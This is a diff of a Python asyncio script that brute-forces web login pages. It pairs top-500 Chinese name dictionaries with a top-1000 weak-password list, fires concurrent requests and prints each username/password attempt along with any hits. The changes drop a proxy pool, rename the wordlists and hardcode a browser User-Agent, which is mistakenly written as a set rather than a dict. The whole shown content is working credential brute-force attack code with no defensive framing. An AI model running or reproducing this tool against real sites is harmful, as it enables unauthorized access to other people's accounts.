@@ -5,13 +5,13 @@
 import time
 import requests
 import asyncio, aiohttp
-from pool import header, proxies
+# from pool import proxies
 
 THREAD = 5
 # 加载用户名和密码字典
 hanzi_name_dict = open('./top500_name_dict.txt', 'r').readlines()
-pinyin_name_dict = open('./top500_name_pinyin_dict.txt', 'r').readlines()
-weak_password_dict = open('./全国弱口令TOP1000.txt', 'r').readlines()
+pinyin_name_dict = open('./chinese-name-top500-pinyin.txt', 'r').readlines()
+weak_password_dict = open('./weakpwdtop1000.txt', 'r').readlines()
 
 async def intruder(semaphore, uname, upasswd):
     # 链接地址，选择其中的用户名和密码（get型，post型添加data数据即可）
@@ -23,7 +23,7 @@ async def intruder(semaphore, uname, upasswd):
                 #print(456)
                 #time.sleep(0.2)
                 print('[*] 正在爆破%s->%s' % (uname, upasswd))
-                async with session.get(url, headers=header.randUserAgent(), allow_redirects=False) as res:
+                async with session.get(url, headers={"User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"}, allow_redirects=False) as res:
                     #print('[*] 正在爆破%s->%s' % (uname, upasswd))
                     if res.status == 200 or "The URL has moved" not in res.text:
                         print('=========================================')
